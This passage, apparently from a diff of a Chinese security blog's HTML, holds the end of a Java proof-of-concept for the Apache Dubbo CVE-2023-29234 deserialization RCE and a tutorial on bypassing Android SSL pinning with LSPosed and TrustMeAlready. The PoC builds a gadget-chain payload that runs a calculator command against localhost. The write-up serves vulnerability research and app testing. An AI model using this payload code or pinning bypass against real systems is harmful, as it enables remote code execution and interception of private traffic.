class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Serialization</span> <span class="variable">serialization</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NativeJavaSerialization</span>();</span><br><span class="line">        <span class="type">NativeJavaObjectOutput</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NativeJavaObjectOutput</span>(nativeJavaBoos);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// header.</span></span><br><span class="line">        <span class="type">byte</span>[] header = <span class="keyword">new</span> <span class="title class_">byte</span>[HEADER_LENGTH];</span><br><span class="line">        <span class="comment">// set magic number.</span></span><br><span class="line">        Bytes.short2bytes(MAGIC, header);</span><br><span class="line">        <span class="comment">// set request and serialization flag.</span></span><br><span class="line">        header[<span class="number">2</span>] = serialization.getContentTypeId();</span><br><span class="line"></span><br><span class="line">        header[<span class="number">3</span>] = Response.OK;</span><br><span class="line">        Bytes.long2bytes(<span class="number">1</span>, header, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// result</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">exp</span> <span class="operator">=</span> getThrowablePayload(<span class="string">&quot;open -a calculator&quot;</span>); <span class="comment">// Rome toString 利用链</span></span><br><span class="line">        out.writeByte(RESPONSE_WITH_EXCEPTION);</span><br><span class="line">        out.writeObject(exp);</span><br><span class="line"></span><br><span class="line">        out.flushBuffer();</span><br><span class="line"></span><br><span class="line">        Bytes.int2bytes(nativeJavaBoos.size(), header, <span class="number">12</span>);</span><br><span class="line">        boos.write(header);</span><br><span class="line">        boos.write(nativeJavaBoos.toByteArray());</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] responseData = boos.toByteArray();</span><br><span class="line"></span><br><span class="line">        <span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Socket</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">20880</span>);</span><br><span class="line">        <span class="type">OutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> socket.getOutputStream();</span><br><span class="line">        outputStream.write(responseData);</span><br><span class="line">        outputStream.flush();</span><br><span class="line">        outputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">static</span> Object <span class="title function_">getThrowablePayload</span><span class="params">(String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">delegate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(Templates.class, o);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> delegate;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/40.png" alt="image"></p>
-<p>完整 POC 项目基于 <a target="_blank" rel="noopener" href="https://github.com/lz2y/DubboPOC/blob/main/src/main/java/top/lz2y/vul/CVE202323638.java">DubboPOC</a> 作的修改和添加，可见 <a target="_blank" rel="noopener" href="https://github.com/RacerZ-fighting/DubboPOC">CVE-2023-29234</a><br><strong>PS：</strong>git diff 当中还存在其他位置的 patch，值得进一步探索其他的利用方式（篇幅有限）。</p>
-</blockquote>
-<h2><span id="引用">引用</span></h2><blockquote>
-<p>[1] <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12396">Apache dubbo 反序列化漏洞（CVE-2023-23638）分析及利用探索 - 先知社区 (aliyun.com)</a><br>[2] <a target="_blank" rel="noopener" href="https://lists.apache.org/thread/wb2df2whkdnbgp54nnqn0m94rllx8f77">CVE-2023-29234: Bypass serialize checks in Apache Dubbo-Apache Mail Archives</a><br>[3] <a target="_blank" rel="noopener" href="https://cn.dubbo.apache.org/zh-cn/overview/tasks/develop/generic/">开发服务 | Apache Dubbo</a><br>[4] <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12333">Apache Dubbo CVE-2023-23638 JavaNative 反序列化漏洞分析 - 先知社区 (aliyun.com)</a><br>[5] <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/vHJpE2fZ8Lne-xFggoQiAg">【漏洞分析】Dubbo Pre-auth RCE（CVE-2021-30179） (qq.com)</a><br>[6] <a target="_blank" rel="noopener" href="https://cn.dubbo.apache.org/zh-cn/docs/concepts/rpc-protocol/">RPC 通信协议 | Apache Dubbo</a><br>[7] <a target="_blank" rel="noopener" href="https://github.com/lz2y/DubboPOC/blob/main/src/main/java/top/lz2y/vul/CVE202323638.java">DubboPOC&#x2F;src&#x2F;main&#x2F;java&#x2F;top&#x2F;lz2y&#x2F;vul&#x2F;CVE202323638.java at main · lz2y&#x2F;DubboPOC (github.com)</a><br>[8] <a target="_blank" rel="noopener" href="https://github.com/y1ong/blog-timeline/issues/334">Apache Dubbo 反序列化漏洞（CVE-2023-29234） · Issue #334 · y1ong&#x2F;blog-timeline (github.com)</a></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2024/01/22/LSPosed-SSL/">
-                APP 测试 - LSPosed 绕过 SSL 证书抓包
-            </a>
-        </h2>
-    
-    <time>
-        Jan 22, 2024
-    </time>
-    <section class="content">
-        <h1><span id="app-测试-lsposed-绕过-ssl-证书抓包">APP 测试 - LSPosed 绕过 SSL 证书抓包</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="http://www.luckysec.cn/posts/279f59b.html">LuckySec</a> 并作补充</p>
-</blockquote>
-<h2><span id="前言">前言</span></h2><blockquote>
-<p>前面介绍了通过<a target="_blank" rel="noopener" href="http://www.luckysec.cn/posts/98df6d1a.html">《VirtualXposed 绕过 SSL 证书抓包》</a>，这个方法有些局限性，比如不能在电脑上的《夜神模拟器》、《雷电模拟器》运行，需要一部测试手机等因素，对于部分人来说可能不太方便，还是更喜欢都在电脑上完成这系列操作，可以尝试用 LSPosed 绕过 SSL 证书抓包。</p>
-</blockquote>
-<h2><span id="0x01-工具简介">0x01 工具简介</span></h2><blockquote>
-<p>LSPosed 是一个基于 Riru&#x2F;Zygisk 的 ART Hook 框架，该框架利用 LSPlant 挂钩框架提供与 OG Xposed 一致的 API, 支持 Android 8.1 ~ 13。</p>
-<p>Xposed 是一个模块框架，可以在不接触任何 APK 的情况下改变系统和应用程序的行为。利用 Xposed 的 TrustMeAlready 模块插件，可以防止软件检测抓包，绕过大部分 ssl-pinning，保证 APP 抓包的可续性能。</p>
-</blockquote>
-<h2><span id="0x02-下载安装">0x02 下载安装</span></h2><blockquote>
-<p>特别提示：在安装之前需要注意以下几点：</p>
-<ul>
-<li>LSPosed 项目地址：<a target="_blank" rel="noopener" href="https://github.com/LSPosed/LSPosed/releases">https://github.com/LSPosed/LSPosed/releases</a></li>
-<li>TrustMeAlready 项目地址：<a target="_blank" rel="noopener" href="https://github.com/ViRb3/TrustMeAlready/releases">https://github.com/ViRb3/TrustMeAlready/releases</a></li>
-<li>系统： Android 8.1 ~ 13</li>
-<li>安装 Magisk v23+ (Riru) &#x2F; v24+ (Zygisk)</li>
-<li>（针对 Riru 风格）从 Magisk 库安装Riru v25+</li>
-<li>在 Magisk 应用程序中下载并安装LSPosed</li>
-<li>重启</li>
-</ul>
-</blockquote>
-<h2><span id="0x03-抓包教程">0x03 抓包教程</span></h2><blockquote>
-<p>注意：如果用雷电模拟器请使用 9.0.19 或之前的版本，避免不必要的问题发生。</p>
-<p>以夜神模拟器为例，添加并运行一个 Android 9 的虚拟机。</p>
-<p><img src="/2024/01/22/LSPosed-SSL/1.png" alt="image"></p>
-<p>在模拟器设置里将虚拟机设置为网络桥接模式、开启 ROOT（默认开启），设置好后重启虚拟机。</p>
-<p><img src="/2024/01/22/LSPosed-SSL/2.png" alt="image"></p>
-<p>在夜神模拟器虚拟机里安装 <code>Magisk.apk</code>、<code>Magisk Terminal Emulato.apk</code>、<code>app-debug.apk</code>（安装成功不显示在主界面）、<code>LSPosed-manager.apk</code>。</p>
-<p><img src="/2024/01/22/LSPosed-SSL/3.png" alt="image"></p>
-<p>打开 <code>Magisk Terminal Emulator.apk</code>，按照如下步骤操作：输入 m 按回车 &gt; 再输入 y 按回车 &gt; 超级用户授权允许 &gt; 再输入 1 按回车 &gt; 输入 a 按回车 &gt; 再输入 1 按回车 &gt; 完毕。</p>
-<p><img src="/2024/01/22/LSPosed-SSL/4.png" alt="image"></p>
-<p>上述步骤完成后，重启模拟器，打开 <code>Magisk.apk</code> 可以发现 Magisk 安装成功。</p>
-<p><img src="/2024/01/22/LSPosed-SSL/5.png" alt="image"></p>
-<p>打开 <code>Magisk.apk</code> &gt; 点击右上角齿轮按钮 &gt; 界面往下滑动，找到 Zygisk 选项打开并重启模拟器虚拟机。</p>
-<p><img src="/2024/01/22/LSPosed-SSL/6.png" alt="image"></p>
-<p>接着将 <code>LSPosed-v1.8.6-6712-zygisk-release.zip</code> 复制到模拟器文件夹里面。打开 <code>Magisk.apk</code> &gt; 底部模块选项 &gt; 从本地安装 &gt; 选择模拟器文件夹内的 <code>LSPosed-v1.8.6-6712-zygisk-release.zip</code> 卡刷包。</p>
-<p><img src="/2024/01/22/LSPosed-SSL/7.png" alt="image"></p>
-<p>重启模拟器虚拟机后，打开 <code>LSPosed-manager.apk</code>，可以发现 LSPosed 安装成功了。</p>
-<p><img src="/2024/01/22/LSPosed-SSL/8.png" alt="image"></p>
-<p>然后在夜神模拟器虚拟机里安装 <code>TrustMeAlready-v1.11.apk</code>，安装这个 apk 主界面图标可能会卡在安装的动画，不必在意，忽略即可。</p>
-<p><img src="/2024/01/22/LSPosed-SSL/9.png" alt="image"></p>
-<p>接着打开 <code>LSPosed-manager.apk</code> 的底部模块选项，点击 TrustMeAlready，启动模块，选择要测试的 APP。</p>
-<p><img src="/2024/01/22/LSPosed-SSL/10.png" alt="image"></p>
-<p>使用 BurpSuite 工具开启代理抓包，设置监听地址为同一局域网 IP 地址，端口自定义，不与电脑其他端口冲突使用即可。</p>
-<p><img src="/2024/01/22/LSPosed-SSL/11.png" alt="image"></p>
-<p>在夜神模拟器手机系统设置中将 WiFi 的代理设置为 BurpSuite 监听器的地址。</p>
-<p><img src="/2024/01/22/LSPosed-SSL/12.png" alt="image"></p>
-<p>最后，打开要测试的 APP，刷新功能页面，在 BurpSuite 中即可看到抓取的 HTTP&#x2F;HTTPS 网络数据包。</p>
-<p><img src="/2024/01/22/LSPosed-SSL/13.png" alt="image"></p>
-</blockquote>
-<h2><span id="参考文章">参考文章</span></h2><blockquote>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=1688786">https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=1688786</a></li>
-</ul>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Android/" rel="tag">Android</a><a class="tag-none-link" href="/tags/Bypass/" rel="tag">Bypass</a><a class="tag-none-link" href="/tags/HTTPS/" rel="tag">HTTPS</a><a class="tag-none-link" href="/tags/LSPosed/" rel="tag">LSPosed</a><a class="tag-none-link" href="/tags/Magisk/" rel="tag">Magisk</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/SSL/" rel="tag">SSL</a>
             </div>
         
 
